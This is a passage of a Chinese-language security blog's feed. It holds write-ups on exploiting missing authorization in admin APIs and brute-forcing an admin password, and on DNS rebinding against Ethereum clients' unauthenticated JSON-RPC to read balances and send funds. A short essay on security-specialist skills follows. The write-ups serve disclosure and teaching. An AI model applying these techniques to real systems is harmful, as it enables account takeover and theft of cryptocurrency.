&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/mfUxtoy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這裡令人奇怪的是，不僅只在於它行動裝置應用程序的 API 呼叫方式，它甚至還有管理員可以用來管理用戶、管理廣播的內容、管理自定義應用程式使用的聊天機器人端口等等。深入研究額外端口的資訊後，我啟動了 Burp 來查看網路流量。起初，我的想法是用 Swagger UI 中的管理端口來替換行動裝置應用程序的端口，用這方法來檢查 Swagger UI 中的管理端口該程式是否有針對這點設置合適的權限管理來區分普通用戶和管理員帳戶。&lt;/p&gt;

&lt;p&gt;從“管理員帳戶”API文檔中，我們可以看到有一個端口使用&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/users/count&lt;/code&gt;打印出管理員用戶數。這看起來很有&lt;strong&gt;前途&lt;/strong&gt;，因為它不需要任何請求主體(Request body)，而且非常簡單。&lt;/p&gt;

&lt;p&gt;以普通用戶身份登入到行動裝置應用程序，我將其中一個 API 呼叫從&lt;code class=&quot;highlighter-rouge&quot;&gt;/xyz /api/users/account/preferences&lt;/code&gt;更換為&lt;code class=&quot;highlighter-rouge&quot;&gt;/xyz/api/admin/users/count&lt;/code&gt;並轉發請求。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dLiDWpv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;成功了！
這意味著這伺服器沒有任何授權管理。基本上，我們可以向包括&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;/chatbot&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;/moderate&lt;/code&gt;的任何 API 端口發出任何請求，因為我們知道請求主體(Request body) 的結構和相關的標頭(Header)。現在讓我們嘗試使用 Swagger UI 的端口進行更多暴力窮舉並擴大這個漏洞利用。&lt;/p&gt;

&lt;p&gt;從 Swagger UI 附件中，我們可以看到有另一個端口藉由向&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/users/{id}&lt;/code&gt;發送請求來查找有關管理員帳戶的訊息。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /xyz/api/admin/users/1 HTTP/1.1
Host: https://admin.company.com
User Agent: MS-RELEASE/1.0.32 (iPhone; iOS 10.1.1; Scale/2.00)
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkdldCB5b3VyIG93biB0b2tlbiEiLCJpYXQiOjE1MTYyMzkwMjJ9.12neWKBPl2q0alhnEiJ_g018_0YHtZMaFzCjsWs0VE

{
  &quot;ID&quot;: 1,
  &quot;Name&quot;: &quot;Admin User&quot;,
  &quot;Username&quot;: &quot;XYZ&quot;,
  &quot;EMail&quot;: &quot;dev@nonexistingdomain.com&quot;,
  &quot;Roles&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;Name&quot;: &quot;Admin&quot;,
      &quot;Menu&quot;:[
        {
          &quot;Path&quot;: &quot;#/admin&quot;,
          &quot;Icon&quot;: &quot;fa-user&quot;,
          &quot;Order&quot;: &quot;1&quot;,
          &quot;Roles&quot;: &quot;READ,WRITE&quot;,
        }
      ]
    }  
}     
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;真的很棒！使用 Burp 的 Intruder 功能，我們可以通過暴力窮舉&lt;code class=&quot;highlighter-rouge&quot;&gt;{id}&lt;/code&gt;參數來取得所有(共8位)管理員的用戶名與電子郵件。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/iluoWSf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;現在我們已取得管理員帳戶名可以嘗試登入。讓我們使用從&lt;a href=&quot;https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials&quot;&gt;Seclists&lt;/a&gt;中獲取通用密碼列表在觸動警報之前運行一個快速暴力破解程式。&lt;/p&gt;

&lt;p&gt;幸運的是，其中一位管理員帳戶的密碼強度較弱，並且該應用程式在登入頁面中沒有任何速率限制。通過取得的管理員權限，我們可以做任何事情，從添加或刪除用戶，修改移動應用程序中顯示的內容，向終端用戶發送通知以及做許多更多很多有趣的事情。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jZQDhGv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;將各個思路組合在一起，以便在 Web應用程式上取得管理員權限實在十分有趣。我還在&lt;a href=&quot;https://secdevops.ai/ios-static-analysis-and-recon-c611eaa6d108&quot;&gt;SecDevOps&lt;/a&gt;上撰寫了關於iOS應用程式靜態分析的&lt;a href=&quot;https://secdevops.ai/ios-static-analysis-and-recon-c611eaa6d108&quot;&gt;入門&lt;/a&gt;。懇請撥冗參閱 ;）&lt;/p&gt;

&lt;p&gt;不要猶豫，歡迎發表並回饋些意見或評論。如果願意的話，你也可以在&lt;a href=&quot;https://twitter.com/67616d654661636&quot;&gt;Twitter&lt;/a&gt;上直接私訊我。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="API" /><category term="Mobile APP" /><summary type="html">偵察是滲透測試中有趣且最重要的部分。良好的使用偵察，可以有效的查找到 API 端口、相關敏感文件或文件夾、鮮嫩多汁的子網域 (編註:原文如此) 等等。在我最近一次的研究中發現了一個由於缺少授權管理甚至敏感文件還設為公開的目標，這使我能夠輕易進入其管理控制台。</summary></entry><entry><title type="html">DNS重綁 偷你以太幣</title><link href="https://security-onigiri.github.io//2018/05/13/dns.html" rel="alternate" type="text/html" title="DNS重綁 偷你以太幣" /><published>2018-05-13T00:00:00+08:00</published><updated>2018-05-13T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/05/13/dns</id><content type="html" xml:base="https://security-onigiri.github.io//2018/05/13/dns.html">&lt;p&gt;●&lt;a href=&quot;https://ret2got.wordpress.com/author/ret2got/&quot;&gt;ret2got&lt;/a&gt; ●未分類 ●2018年1月19日 ●約4分鐘可讀完&lt;/p&gt;

&lt;p&gt;當我們針對如何利用&lt;a href=&quot;https://twitter.com/taviso/&quot;&gt;Tavis Ormandy&lt;/a&gt;發掘的&lt;strong&gt;在本地主機上的未驗證&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務&lt;/strong&gt;開展討論時，我所想到的第一件事就是把這手法套在以太坊的客戶端（Geth，Mist與Parity）。&lt;/p&gt;

&lt;p&gt;大多數以太坊客戶端都在本機上的8545埠上運行&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務，但由於它位於本機上，所以基於&lt;a href=&quot;https://en.wikipedia.org/wiki/Same-origin_policy&quot;&gt;SOP&lt;/a&gt;的緣故，我們無法直接從用戶的瀏覽器訪問它。在電子錢包中的
&lt;a href=&quot;https://github.com/spesmilo/electrum/issues/3374&quot;&gt;這個文章&lt;/a&gt;利用了&lt;a href=&quot;https://en.wikipedia.org/wiki/Cross-origin_resource_sharing&quot;&gt;CORS&lt;/a&gt;標頭來通過本地主機上的JSON-RPC破解並控制用戶的電子錢包。&lt;/p&gt;

&lt;p&gt;這讓Geth的JSON-RPC看起來非常安全，因為它沒有返還任何的&lt;code class=&quot;highlighter-rouge&quot;&gt;CORS&lt;/code&gt;標頭，但是後來&lt;a href=&quot;https://github.com/cpacia&quot;&gt;cpacia&lt;/a&gt;則在&lt;a href=&quot;https://github.com/spesmilo/electrum/issues/3374&quot;&gt;回文&lt;/a&gt;中下了個有關這個以太坊電子錢包的評論，而這正引發了我的新想法。以下是他當時的回文&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;只是禁用&lt;code class=&quot;highlighter-rouge&quot;&gt;CORS&lt;/code&gt;仍然容易受到DNS重新綁定的攻擊。它應該需要被驗證。       〜cpacia&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;我曾聽說過DNS重新綁定，但從來沒有試圖深入研究它。由於Geth的JSON-RPC也未經過身份驗證，它也很可能容易受到DNS重新綁定攻擊是嗎？&lt;/p&gt;

&lt;p&gt;還著實作的想法，我後來在&lt;a href=&quot;https://searchsecurity.techtarget.com/definition/DNS-rebinding-attack&quot;&gt;這裡&lt;/a&gt;找到了些&lt;a href=&quot;https://en.wikipedia.org/wiki/DNS_rebinding&quot;&gt;DNS重新綁定&lt;/a&gt;的基本定義。&lt;/p&gt;

&lt;p&gt;我嘗試開始研究DNS的重新綁定，但遇到個主要問題是所有的文章都是上古世紀的遺物。所以我在Bug Bounty的論壇上詢問了這個問題，幸運的，&lt;a href=&quot;https://twitter.com/TheBoredEng&quot;&gt;Luke Young&lt;/a&gt;就將他2017年關於現今可行的DNS重新開發利用之&lt;a href=&quot;https://www.youtube.com/watch?v=Q0JG_eKLcws&quot;&gt;DEFCON神級演講&lt;/a&gt;的連結發來給我。它還包括了一個&lt;a href=&quot;https://github.com/linkedin/jaqen&quot;&gt;自動化工具&lt;/a&gt;，可以在大多數現存瀏覽器上實現DNS重新綁定。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TJQyWCe.png&quot; alt=&quot;&quot; /&gt;
(嘿，起司，我知道你可以，但針對”現存”，請你躺回去。)&lt;/p&gt;

&lt;p&gt;了解愈多讓我愈好奇，但我並不想使用任何預製工具。所以我開始編寫我自己的DNS伺服器。Python有一個非常好的函式庫──&lt;code class=&quot;highlighter-rouge&quot;&gt;dnslib&lt;/code&gt;。它可以為我處理大部分的東西。我還註冊了一個網域，並設置了一些&lt;code class=&quot;highlighter-rouge&quot;&gt;glue records&lt;/code&gt;指向我的伺服器，並將它們用作&lt;code class=&quot;highlighter-rouge&quot;&gt;nameservers&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;因為我想看看不同瀏覽器在遇到極低的TTL中的行為表現，所以我讓我的DNS服務器返還&lt;code class=&quot;highlighter-rouge&quot;&gt;TTLs &amp;lt; 5&lt;/code&gt;。而有趣的是，Chrome、Firefox和Safari都接受了這個等待60秒的DNS回應，儘管他標明TTL小於5。&lt;/p&gt;

&lt;p&gt;60秒並不是很長時間，應該還算在可接受範圍，而我想我可以讓用戶留在我的網頁上至少60秒。現在唯一剩下的就是實際嘗試。&lt;/p&gt;

&lt;p&gt;我用&lt;code class=&quot;highlighter-rouge&quot;&gt;--rpc&lt;/code&gt;旗幟（當然是在testnet上）&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;geth -rpc -testnet&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;現在是時候加點Javascript的料了，而這正是最難的部分。因為我不是一個好的web開發人員，每次使用JavaScript的處理某些行為時，我都很難將自己的思緒兜起來以JS實現。所以我跌跌撞撞的在3個小時內寫出了一個非常糟糕但有效果的JavaScript。而最初的結果是成功的。&lt;/p&gt;

&lt;p&gt;現在為了使它與geth一起成功運行，因為&lt;code class=&quot;highlighter-rouge&quot;&gt;SOP&lt;/code&gt;，我必須在8545埠上運行我的web伺服器和網域。但是，如果我到時要受害者自主將Web連結封包發送給任何埠號為8545的人，但這方法感覺起來實在有點草率且不精緻。&lt;/p&gt;

&lt;p&gt;所以我想到的解決方案是使用&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;。我讓&lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;監聽8545和80，並為這兩個埠各設置一個虛擬主機。現在我可以建立&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;將對80的請求轉到8545埠並在其中隱藏的&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;運行所有的JavaScript。&lt;/p&gt;

&lt;p&gt;另一個問題是關於多個用戶，如果多個用戶同時訪問我的網域會怎麼樣？DNS伺服器肯定會因為我這種使用基於計數器的系統而感到困惑，並且因此無法區分各個用戶的請求。這問題讓我整個計畫撞牆了一段時間，直到我記起有&lt;code class=&quot;highlighter-rouge&quot;&gt;subdomains&lt;/code&gt;這個東西。&lt;/p&gt;

&lt;p&gt;每當用戶訪問主域名時，我都可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;為其添加一個隨機子域名用作標識。我知道我可能沒法很好地解釋它，但接下來我舉個例子好了。&lt;/p&gt;

&lt;p&gt;讓我們假設我的網域名稱為&lt;code class=&quot;highlighter-rouge&quot;&gt;attacker.com&lt;/code&gt;而我的伺服器的IP是&lt;code class=&quot;highlighter-rouge&quot;&gt;87.87.87.87&lt;/code&gt;這樣，那麼流程是：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;受害者在瀏覽器中打開&lt;code class=&quot;highlighter-rouge&quot;&gt;attacker.com&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;首先，DNS請求attacker.com被發送到我的伺服器，並回應以真實IP &lt;code class=&quot;highlighter-rouge&quot;&gt;87.87.87.87&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;接下來，&lt;code class=&quot;highlighter-rouge&quot;&gt;attacker.com&lt;/code&gt;加載到用戶的瀏覽器，然後創建一個隱藏的&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;與一個隨機子域&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrsub.attacker.com:8545&lt;/code&gt;，並將其附加到&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;body&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;現在，DNS請求被發送到我的伺服器的子網域&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrsub.attacker.com&lt;/code&gt;，並且DNS伺服器再次回應真實IP &lt;code class=&quot;highlighter-rouge&quot;&gt;87.87.87.87&lt;/code&gt;。但是這一次，由於目的位於8545埠上，所以&lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;會使用不同的虛擬主機進行回應，進而開始DNS重新綁定攻擊。&lt;/li&gt;
  &lt;li&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrsub.attacker.com:8545&lt;/code&gt;中的&lt;code class=&quot;highlighter-rouge&quot;&gt;Javascript&lt;/code&gt;會等待60秒，然後發送一個&lt;code class=&quot;highlighter-rouge&quot;&gt;XmlHttpRequest&lt;/code&gt;給&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrr.attacker.com:8545/test&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;由於DNS緩存已過期，瀏覽器會再次解析DNS。這一次，我的伺服器會回應IP &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;現在請求實際上被發送給&lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:8545/test&lt;/code&gt;而不是我的伺服器，並且由於它來源仍被認知為&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrr.attacker.com:8545&lt;/code&gt;，所以我們仍能夠讀取回應。&lt;/li&gt;
  &lt;li&gt;由於我們每次都會生成一個隨機的子網域，因此我們現在甚至可以容納多個用戶，因為子網域可以執行其身份標識。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;為此，我還不得不優化JavaScript，以確保它在95％的時間內運作正常。我在真實的DNS查詢之前添加了一些虛假的DNS查詢，以便它在錯誤的時間不會用錯誤的IP進行響應。&lt;/p&gt;

&lt;p&gt;這基本上也可以用存儲型XSS來破解利用。只需將Script的src指向目標添加&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;TADA&lt;/code&gt;即可！&lt;/p&gt;

&lt;p&gt;所以現在我們可以閱讀&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務的回應，這意味著我們可以讀取他們的以太幣地址，他們的存款數，並且如果他們的賬戶未鎖，他們可能可以竊取他們的以太幣。&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;的API有一個相當不錯的方法──&lt;code class=&quot;highlighter-rouge&quot;&gt;eth_sendTransaction&lt;/code&gt;，它基本上可以用來從用戶帳戶發送&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;我在&lt;a href=&quot;http://rebinddns.ml/&quot;&gt;http://rebinddns.ml&lt;/a&gt; (注意點擊) 上設置了概念驗證。如果你持續超過60秒，並且使用&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;運行Geth（或任何其他&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;客戶端），您將看到一個&lt;code class=&quot;highlighter-rouge&quot;&gt;alert（）&lt;/code&gt;，其中將包含您的&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;地址及其餘額。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jsroMso.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;PoC中使用的所有文件都可以在我的&lt;a href=&quot;https://github.com/drigg3r/Ethereum-JSONRPC-DNS-Rebinding&quot;&gt;Github&lt;/a&gt;上找到。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;min.js - 在8545埠上生成子網域及隱藏iframe的Js文件&lt;/li&gt;
  &lt;li&gt;main.js - 執行DNS重新綁定的Js文件&lt;/li&gt;
  &lt;li&gt;server.py - 用python編寫的DNS伺服器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本篇主要概念是以注入的惡意轉址搭配DNS重綁定來攻擊以太坊的未驗證&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務，來取得攻擊成果。&lt;/p&gt;

&lt;p&gt;我已經證實Geth以太幣的C++客戶端和python客戶端都很脆弱。PoC已經在Firefox，Chrome和Safari上進行了測試。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;PS：這已經被報告給了&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;基金會，但他們並不認為它是一個有效的漏洞。&lt;/p&gt;

&lt;p&gt;有任何問題，你都可以到我的twitter&lt;a href=&quot;https://twitter.com/ret2got&quot;&gt;@ret2got&lt;/a&gt;上私訊我。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Blockchain" /><summary type="html">●ret2got ●未分類 ●2018年1月19日 ●約4分鐘可讀完 當我們針對如何利用Tavis Ormandy發掘的在本地主機上的未驗證JSON-RPC服務開展討論時，我所想到的第一件事就是把這手法套在以太坊的客戶端（Geth，Mist與Parity）。</summary></entry><entry><title type="html">你不算個資安專家，如果你只是…</title><link href="https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you.html" rel="alternate" type="text/html" title="你不算個資安專家，如果你只是..." /><published>2018-05-08T00:00:00+08:00</published><updated>2018-05-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you</id><content type="html" xml:base="https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you.html">&lt;h1 id=&quot;well-you-are-not-a-security-specialist-if-you-&quot;&gt;Well, you are not a “Security Specialist” if you …&lt;/h1&gt;

&lt;p&gt;Starting this thread is easy …&lt;/p&gt;

&lt;p&gt;I spotted many of people nowadays claimed that they are an “InfoSec Specialist” on their resume, Linkedin profile, etc. This will eventually makes life a bit more difficult for the HR personnel or inexperience hiring managers that are genuinely looking for a real-deal InfoSec Specialist to fill certain specifi job roles.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;用講的很簡單 …&lt;/p&gt;

  &lt;p&gt;我發現現在很多人在他們的履歷、Linkedin 專頁等等，宣稱自己是”資安專家”。這只是在為難想找真正的專家來填補工作空缺的那些 HR 或人事經理人們而已。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So, here are things that separate them from the real specialists and experts out there. See if you may be considered into one of them (inadvertently or deliberately):&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以，這裡是一些可以用來區分他們是否為真正的專家，或是熟捻相關事務的從業人員，或許你會想考慮其中一個職業（不小心或蓄意的）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Pentesting/Ethical Hacking Specialist if your day to day job just utilzing some tools to look for vulnerability such as Qualys, Nessus, OpenVAS, Nikto, Acunetix, and alike. We called these tools: Automated Vulnerability Scanners and using one of them does not makes you a Hacker or Pentester Specialist. To makes you a real Pentester, you need to be able to break into the systems manually and be able to gain root/administrator privileges on that system you are breaking (in which pratically allowed you to do anything you wanted with that compromised system). Alternatively you should be able to demonstrate the capability to ex-filtrate any sensitive information out from its protected repositories even if you only given a standard user privilege access to that system.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個專業&lt;strong&gt;滲透測試/道德駭客&lt;/strong&gt;，如果你每天的工作內容都是，使用類似 Qualys、Nessus、OpenVAS、Nikto、Acunetix 之類的工具尋找弱點。我們稱這些工具為：自動化弱點掃描器，使用其中一個工具並不會讓你變成駭客或是滲透測試專家。想當一個真正的滲透測試者，你需要要能手動侵入一個系統並且獲得該系統的管理員權限（表示在那被攻陷的系統上你可以為所欲為）。或是你應該能展示出從一個被保護的存放處洩漏出敏感資訊的能力，甚至你只有被給予一個該系統上一般的使用者權限。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Malware Reverse Engineering Specialist if what you are doing simply googling the executable filenames or its MD5 hashes and look it up at VirusTotal or take that executables and run it into the Automated Malware Sandbox Analyzer such as Cuckoo, VT, Malwr, GFI, etc. to be called a real Malware Revese Engineering Specialist, you should be able to perform surgical of the malicious binary files using Hex Editor, Debugger and Disassembler and MOST IMPORTANTLY to be able to decode, de-obfuscate and probaly decrypt the codes and login behind the binary file and locate in which part of the code’s sub-routine that is/are doing evil as to validate if the binary is truly malicious.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個專業&lt;strong&gt;惡意程式逆向工程師&lt;/strong&gt;，如果你只是簡單的 google 執行檔的名稱或是他的 MD5 雜湊並在 VirusTotal 搜尋它，或是丟到 Cuckoo、VT、Malwr、GFI 等等的自動化惡意程式沙盒分析工具。要想成為一個真正的惡意程式逆向工程專家，你應該要能使用&lt;em&gt;十六進位編輯器&lt;/em&gt;、&lt;em&gt;除錯器&lt;/em&gt;、&lt;em&gt;反組譯器&lt;/em&gt;剖析惡意程式二進位檔案，還有&lt;strong&gt;最重要的是&lt;/strong&gt;可以解碼、解混淆並正確的解密程式碼，並且定位到執行惡意行為的程式區段，如果它是真的惡意程式的話。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Cyber Threat Intelligent Specialist if what you do is just to read and forward InfoSec news to your bosses/IT Team without having a proper method on how to dissect, filter and process that information into a valuable intelligence that are useful for your organization in term of how to provide early detection, prevent and deter the cyber attack or casualties from arising or happening to your ogranization.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個&lt;strong&gt;網路威脅情資專家&lt;/strong&gt;，如果你只是純粹讀一讀資安新聞，或是轉發資安新聞給你老闆/IT 團隊。在危害發生前，你需要提供一個適切的方法來處理該資訊成為對你的組織有價值的情資，以達到早先偵測、避免與阻斷網路攻擊的目的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Network Attack/DDoS Mitigator Specialist if what you do is merely to have your inbound internet link traffics routed behind a DDoS Scrubbing Provider (like Prolexic/Akamai, Verisign, Incapsula, etc) and you were involved to any DDoS attack events just because you were being called /paged-out by oyur DDoS cloud provider to joined their bridgeline and listening to what they are doing over the phone. To be called a specialist in this field, you need to know how exactly the Network/DDoS attacks coming to your network: the attack vectors, methods, protocols being abused, types of attacks, what is the mitigation control you have in-premise and on-the-cloud, when and what mitigations to activate, etc. You need to be proficient in reading and understand the underlying of packet captures and you also need to know how to build and enhance your defense posture to adapt with the ever increasing attack methods being launch and seen to-date.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個&lt;strong&gt;網路攻擊/分散式阻絕緩解專家&lt;/strong&gt;，如果你只是修改路由將網際網路的輸入流量轉接到 DDoS 流量清洗商(例:Prolexic/Akamai, Verisign, Incapsula…)或只從鍵盤參與或是與你的 DDoS 流量清洗商用電話溝通加入他們的實況轉播。
這方面的專業人士必須真正了解網路與 DDoS 攻擊 是如何進入你的網路，例如: 清楚攻擊向量、方式、使用的通訊協定、攻擊類型，地端與雲端可用的緩解方案，緩解方案的啟動時機。
舉例來說，你必須熟悉如何獲取封包並且能夠閱讀內容，同時你必須能夠建立並加強自己的防禦機制去解決與日俱增的攻擊方式和現今正在發生的攻擊。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not Security Event Management Specialist if what you do is just to received event alerts from your IDSes or Log alerting/correclation tools (such as Splunk, ArcSight ESM, etc) and escalate this alerts to your security vendor whom job function is simply doing Level-1 of event forwarding blindly to the proper team. In order to makes you a real Security Event Management Specialist, you need to be able to do some basic analysis of the events and to determine which ones are real events and which ones are false positive. You also needs to have capability to filter out and reduced any false positives by tuning the SIEM system you have access to.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個&lt;strong&gt;資安事件管理專家&lt;/strong&gt;，如果你只是從你的入侵偵測系統(IDS)收警告或日誌告警/關聯工具 (諸如：Splunk、ArcSight ESM 等)並將告警呈報給你的資安供應商，這種初級且簡單到可以矇眼轉送的工作。為了成為一個正港的資安事件管理職人，你需要能實作初步的分析判斷哪些是誤報，哪些是真正的告警。你也需要會調校你的 SIEM 系統以達到過濾及減少誤報。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not Security Intrusion Analyst/Specialist if you are simply doing the above job roles of Security Event Management Specialist. To makes you a real deal Seucrity Intrusion Analyst/Specialist, you need to be able to read inside packet capture and tell us on the spot of what is it raelly happening on any particular events. You also will need to be able to perform a holistic analysis even in the case where full packet capture is not available and you need to rely on other means likes system/proxy/firewall/network logs etc.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不能算是正港的&lt;strong&gt;資安入侵分析師/專家&lt;/strong&gt;，如果你只是做一些上面提到資安事件管理專家做的事情。要想當個真真正正的資安入侵分析師/專家，你需要有透過封包分析並告訴我們目前到底發生了什麼事情。同時也要在封包收錄不足的情況下，佐以系統/代理伺服器/防火牆/網路日誌等等，做到一個完整的解析說明。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Computer Forensic Specialist if what you konw is just to check the system logs from any error message and to run anti-virus software to find out whether or not the system is infected by viruses. To be called a Computer Forensics Specialist, you need to be able to perform proper data acquisition of the evidence from HDD or any other storage, to preserve it well and ensure it is adminssible to the court during trials, to be able to dig deeper down to the file system level of different OSes to find out artifacts of events being investigate, detecting and recovering deleted files from slack spaces and even to recover evidence from volume shadow copies, registry entries, prefetch data, etc. You also need to be proficient with handling volatile memory, know how to acquire them as well as to find malicious code could possibly hiding into other legitimate process(es) via process hollowing, etc.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不能算是一個&lt;strong&gt;計算機鑑識專家&lt;/strong&gt;，如果你只是看看系統日誌的錯誤訊息，並運行防毒軟體來確認是否有感染跡象。要想當個 real 的計算機鑑識專家，你要會從 HDD 或其他存儲裝置獲取恰當的跡證資料，並將之保存得當並確定這是可以在審訊中做為依據的。要能深入不同作業系統上的檔案系統層級，去找尋正在調查的人為事件、偵測並從殘餘空間復原被刪除的檔案，甚至從 volume shadow 拷貝、註冊表、prefetch file 等等來復原證據，你也需要專業到可以處理揮發性記憶體，知道如何從中取得可能存在合法形成中的惡意程式碼。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hope this article could provide some insight to any HR practitioner specializing in InfoSec recruitment or to any hiring managers that are truly looking for a better (if not one of the best) InfoSec Specilists out there to perform a real challenging jobs that required their true expertise of their respective fields.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;希望這個文章可以讓與資安相關的 HR 從業人員或人事經理多了解一點，在資安相關工作雇用上可以找到好一點的(如果不是要最好的)資安專家，來實踐一些真正需要他們專業及屌炸天的技能來應付的挑戰。&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="InfoSec" /><category term="forensics" /><category term="Penetration Test" /><category term="Reversing Engineering" /><summary type="html">Well, you are not a “Security Specialist” if you …</summary></entry><entry><title type="html">沒有RCE？那就直接SSH進去啊！</title><link href="https://security-onigiri.github.io//2018/04/18/rcessh.html" rel="alternate" type="text/html" title="沒有RCE？那就直接SSH進去啊！" /><published>2018-04-18T00:00:00+08:00</published><updated>2018-04-18T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/04/18/rcessh</id><content type="html" xml:base="https://security-onigiri.github.io//2018/04/18/rcessh.html">&lt;p&gt;&lt;del&gt;何不食肉糜?&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;[&lt;img src=&quot;http://blog.jr0ch17.com/images/2017-11-08_12h39_35.png&quot; alt=&quot;My Profile Photo&quot; /&gt;&lt;/p&gt;

